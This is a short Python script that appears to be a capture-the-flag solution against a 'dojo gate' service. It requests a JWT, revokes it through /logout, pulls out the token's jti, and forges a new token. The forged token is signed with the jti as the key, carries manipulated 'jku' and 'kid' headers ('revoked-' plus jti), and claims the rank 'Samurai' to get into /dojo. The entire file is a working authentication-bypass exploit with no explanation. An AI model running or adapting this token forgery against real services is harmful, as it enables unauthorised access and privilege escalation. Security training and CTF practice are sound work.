
import base64
import json
import jwt
import requests

BASE = "http://localhost"

data = {
	"name": "test",
	"redirect_uri": "/dojo"
}
r = requests.post(BASE + "/gate/", data=data, allow_redirects=False)
token = r.headers["Location"].split("token=")[1]

requests.get(BASE + "/logout", params={"token": token})

jti = json.loads(base64.b64decode(token.split(".")[1] + "=="))["jti"]

headers = {
	"jku": "http://ctc2025-dojo-gate:8000/jwks",
	"kid": "revoked-" + jti
}
token = jwt.encode({"rank": "Samurai"}, jti, headers=headers)

r = requests.get(BASE + "/dojo", params={"token": token})
print(r.text)
